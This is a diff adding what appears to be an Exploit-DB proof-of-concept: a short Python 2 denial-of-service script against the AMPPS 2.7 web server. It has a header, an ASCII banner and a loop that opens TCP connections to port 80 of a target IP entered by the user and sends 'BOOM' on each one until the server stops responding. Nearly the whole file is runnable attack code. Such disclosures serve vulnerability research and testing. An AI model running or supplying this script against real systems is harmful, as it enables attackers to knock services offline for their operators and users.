@@ -1,0 +1,46 @@
+# Exploit Title: AMPPS 2.7 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-11-12
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.ampps.com/
+# Software Link: https://kent.dl.sourceforge.net/project/ampps/2.7/Ampps-2.7-setup.exe
+# Version: 2.7
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+
+#!/usr/bin/python
+import socket
+
+print """
+         \\\|///
+       \\  - -  //
+        (  @ @ )
+ ----oOOo--(_)-oOOo----
+   AMPPS 2.7
+   Ihsan Sencan
+ ---------------Ooooo----
+                (   )
+       ooooO     ) /
+       (   )    (_/
+        \ (
+         \_)
+"""
+Ip = raw_input("[Ip]: ")
+Port = 80 # Default port
+ 
+d=[]
+c=0
+while 1:
+    try:
+        d.append(socket.create_connection((Ip,Port)))
+        d[c].send("BOOM")
+        print "Sie!"
+        c+=1
+    except socket.error: 
+        print "Done!"
+        raw_input()
+        break
